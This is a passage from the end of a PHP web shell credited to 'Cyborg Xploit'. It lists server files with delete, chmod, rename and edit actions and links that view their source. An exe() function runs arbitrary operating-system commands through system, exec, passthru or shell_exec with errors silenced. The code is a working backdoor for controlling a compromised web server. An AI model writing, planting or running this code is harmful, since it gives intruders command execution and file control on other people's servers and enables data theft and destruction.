</tr>';
}
echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($scandir as $file){
if(!is_file($path.'/'.$file)) continue;
$size = filesize($path.'/'.$file)/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}
echo '<tr>
<td><a href="?filesrc='.$path.'/'.$file.'&path='.$path.'">'.$file.'</a></td>
<td><center>'.$size.'</center></td>
<td><center>';
if(is_writable($path.'/'.$file)) echo '<font color="#FFFFFF">';
elseif(!is_readable($path.'/'.$file)) echo '<font color="#B0B0B0">';
echo perms($path.'/'.$file);
if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font>';
echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
<option value="edit">Edit</option>
</select>
<input type="hidden" name="type" value="file">
<input type="hidden" name="name" value="'.$file.'">
<input type="hidden" name="path" value="'.$path.'/'.$file.'">
<input type="submit" value=">">
</form></center></td>
</tr>';
}
echo '</table>
</div>';
}
echo "<br><center><a href='https://github.com/xjusthaxor'>&copy; Cyborg Xploit</a></center></body></html>";
function exe($cmd) { 	
if(function_exists('system')) { 		
		@ob_start(); 		
		@system($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('exec')) { 		
		@exec($cmd,$results); 		
		$buff = ""; 		
		foreach($results as $result) { 			
			$buff .= $result; 		
		} return $buff; 	
	} elseif(function_exists('passthru')) { 		
		@ob_start(); 		
		@passthru($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('shell_exec')) { 		
		$buff = @shell_exec($cmd); 		
		return $buff; 	
	} 
}
function perms($file){
$perms = fileperms($file);
if (($perms & 0xC000) == 0xC000) {
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
$info = 'p';
} else {
$info = 'u';
}
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));
return $info;
}
?>
